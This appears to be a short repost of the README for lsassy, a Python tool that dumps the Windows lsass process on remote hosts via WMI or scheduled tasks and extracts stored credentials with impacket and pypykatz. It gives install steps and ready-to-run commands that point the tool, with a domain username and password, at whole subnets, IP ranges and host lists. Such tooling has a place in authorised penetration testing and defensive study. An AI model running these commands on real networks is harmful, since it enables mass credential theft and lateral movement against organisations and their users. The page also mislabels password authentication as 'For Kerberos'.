- - -
### What is this ? 😦
- Python tool to remotely **extract credentials** on a set of hosts.
- This tool uses **impacket** project to remotely read necessary bytes in **lsass dump** and **pypykatz** to extract credentials.
- By default, [lsassy](https://github.com/Hackndo/lsassy#installation) will try to dump lsass remotely using ` comsvcs.dll ` method, either via WMI or via a remote scheduled task.
**But Note** :  [lsassy](https://github.com/Hackndo/lsassy#installation) works with python >= <u>3.7</u>

- - -
#### Installation : 📱📱📱

```python
python3 -m pip install lsassy

>>> print("Or Perform the below Commands")

git clone https://github.com/Hackndo/lsassy.git
cd lsassy/ ; python3 setup.py install
```


- - -
## Usage : 🥑🥑🥑

#### For Kerberos : 

```sh
lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.0/24
lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.1-10
lsassy -d hackn.lab -u pixis -p P4ssw0rd hosts.txt
lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.1-192.168.1.10
```

Don't forget to see the help menu for more options.
```sh
lsassy --help
```

![Imgur](https://i.imgur.com/dXn5YGS.png)


- - -

